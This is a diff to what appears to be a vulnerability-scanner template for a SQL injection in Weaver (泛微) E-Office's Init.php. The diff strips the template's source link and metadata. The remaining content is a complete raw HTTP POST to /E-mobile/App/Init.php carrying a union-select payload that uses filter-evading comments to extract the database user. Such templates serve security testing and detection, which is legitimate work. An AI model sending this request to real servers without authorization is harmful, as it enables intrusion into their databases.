@@ -3,12 +3,8 @@ info:
   name: 泛微 OA E-Office Init.php SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yehzqutvxrbavkg7'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yehzqutvxrbavkg7
-    fofa: 暂无
 http:
 - raw:
   - 'POST /E-mobile/App/Init.php?m=getSelectList_Crm HTTP/1.1
@@ -21,8 +17,6 @@ http:
 
 
     Connection: close
-
-
 
 
     cc_parent_id=-999 /*!50000union*/ /*!50000select*/ 1,user()#
